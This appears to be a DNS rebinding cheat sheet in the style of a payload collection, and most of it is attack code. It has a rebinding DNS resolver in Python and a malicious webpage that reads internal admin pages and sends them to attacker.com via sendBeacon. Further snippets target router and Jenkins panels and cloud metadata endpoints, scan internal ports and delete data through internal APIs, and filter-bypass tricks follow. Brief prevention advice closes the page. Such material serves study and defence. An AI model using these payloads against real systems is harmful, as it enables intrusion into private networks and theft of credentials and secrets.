# DNS Rebinding

## Description
DNS Rebinding is a web-based attack technique that changes the IP address of an attacker-controlled domain to the IP address of a target application, bypassing the same-origin policy. This allows attackers to make unauthorized requests to internal networks and services that should not be accessible from the internet.

## How It Works

1. Attacker registers a malicious domain (e.g., attacker.com)
2. Attacker sets up a custom DNS server with very short TTL
3. Victim visits attacker's webpage
4. DNS initially resolves to attacker's server, serving malicious JavaScript
5. After TTL expires, DNS resolves to internal/target IP (e.g., 192.168.1.1)
6. JavaScript now makes requests to internal network
7. Browser sends requests thinking it's still same-origin

## Attack Prerequisites

- Control over a domain name
- Custom DNS server with controllable TTL
- Victim visits attacker's webpage
- Target service accessible from victim's network

## Attack Setup

### 1. DNS Server Configuration

```python
# Simple DNS rebinding server
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, A

class RebindResolver(BaseResolver):
    def __init__(self):
        self.request_count = {}

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        reply = request.reply()

        if qname not in self.request_count:
            self.request_count[qname] = 0
        self.request_count[qname] += 1

        # First request: return attacker IP
        # Subsequent: return target IP
        if self.request_count[qname] == 1:
            ip = "203.0.113.1"  # Attacker's server
        else:
            ip = "192.168.1.1"  # Target internal IP

        reply.add_answer(RR(qname, rdata=A(ip), ttl=0))
        return reply
```

### 2. Malicious Webpage

```html
<!DOCTYPE html>
<html>
<head>
    <title>DNS Rebinding Attack</title>
</head>
<body>
    <script>
    // Wait for DNS TTL to expire
    setTimeout(function() {
        // Now requests go to internal network
        fetch('http://attacker.com:8080/admin')
            .then(response => response.text())
            .then(data => {
                // Exfiltrate data
                navigator.sendBeacon('https://attacker.com/exfil', data);
            });
    }, 3000);  // Wait 3 seconds for DNS rebind
    </script>
</body>
</html>
```

## Tools

### Singularity of Origin
```bash
# Clone and setup
git clone https://github.com/nccgroup/singularity.git
cd singularity

# Start the DNS server
go run cmd/singularity-server/main.go

# Access the attack manager
# http://localhost:8080/manager.html
```

### Features:
- Multiple rebinding strategies
- Port scanning capabilities
- Automated exploit delivery
- Web-based management interface

### rebind.it
Online service for DNS rebinding attacks:
```
# Format: <target-ip>.<attacker-domain>.rebind.it
192.168.1.1.attacker.rebind.it
```

### rbndr (taviso)
```bash
# Simple DNS rebinding service
# Alternates between two IPs
# Format: <ip1>-<ip2>.rbndr.us

# Example: Alternate between 203.0.113.1 and 192.168.1.1
c0a80101-c0a80102.rbndr.us
```

## Bypass Techniques

### 1. Using 0.0.0.0
```
# 0.0.0.0 often resolves to localhost
# Can bypass filters that only block 127.0.0.1
0.0.0.0 -> 127.0.0.1
```

### 2. CNAME Records
```
# Use CNAME to point to localhost
attacker.com CNAME localhost.
```

### 3. IPv6 Localhost
```
# IPv6 localhost
::1
```

### 4. Decimal IP Notation
```
# 127.0.0.1 in decimal
2130706433
```

### 5. DNS Rebinding with Multiple A Records
```
# Return multiple A records
# Browser may cache different one
attacker.com A 203.0.113.1
attacker.com A 192.168.1.1
```

## Attack Scenarios

### Internal Service Access
```javascript
// Access internal router admin
fetch('http://192.168.1.1/admin')
    .then(r => r.text())
    .then(data => exfiltrate(data));

// Access internal Jenkins
fetch('http://jenkins.internal:8080/script')
    .then(r => r.text())
    .then(data => exfiltrate(data));
```

### Cloud Metadata Service
```javascript
// AWS metadata (if accessible from victim's network)
fetch('http://169.254.169.254/latest/meta-data/')
    .then(r => r.text())
    .then(data => exfiltrate(data));

// GCP metadata
fetch('http://metadata.google.internal/computeMetadata/v1/')
    .then(r => r.text())
    .then(data => exfiltrate(data));
```

### Port Scanning
```javascript
// Scan internal ports
const target = '192.168.1.1';
const ports = [22, 80, 443, 8080, 8443, 3306, 5432];

ports.forEach(port => {
    const img = new Image();
    const start = Date.now();
    img.onload = img.onerror = function() {
        const time = Date.now() - start;
        if (time < 1000) {
            console.log(`Port ${port} is open`);
        }
    };
    img.src = `http://${target}:${port}/`;
});
```

### Exploiting Internal APIs
```javascript
// If internal API has no authentication
fetch('http://internal-api:8080/users', {
    method: 'DELETE'
});

// Extract sensitive data
fetch('http://internal-api:8080/secrets')
    .then(r => r.json())
    .then(secrets => {
        navigator.sendBeacon('https://attacker.com/collect',
            JSON.stringify(secrets));
    });
```

## Detection & Prevention

### Server-Side
```
1. Validate Host header against whitelist
2. Use authentication for internal services
3. Implement network segmentation
4. Block private IP ranges at firewall
5. Use HTTPS with valid certificates
```

### Client-Side
```
1. Browser vendors implement DNS pinning
2. Disable JavaScript (extreme measure)
3. Use network-level filtering
```

### Network-Level
```
1. Block DNS responses containing private IPs
2. Implement split-horizon DNS
3. Use DNS over HTTPS/TLS with validation
```

## Host Header Validation

```python
# Server-side protection
ALLOWED_HOSTS = ['example.com', 'www.example.com']

def validate_host(request):
    host = request.headers.get('Host', '')
    if host not in ALLOWED_HOSTS:
        return False
    return True
```

## Common Targets

| Target | Port | Description |
|--------|------|-------------|
| Router Admin | 80, 443 | Network configuration |
| IoT Devices | Various | Smart home devices |
| Jenkins | 8080 | CI/CD server |
| Kubernetes | 6443, 10250 | Container orchestration |
| Docker | 2375, 2376 | Container daemon |
| Redis | 6379 | In-memory database |
| Elasticsearch | 9200 | Search engine |
| Cloud Metadata | 169.254.169.254 | Cloud instance metadata |

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DNS%20Rebinding
- https://github.com/nccgroup/singularity
- https://crypto.stanford.edu/dns/
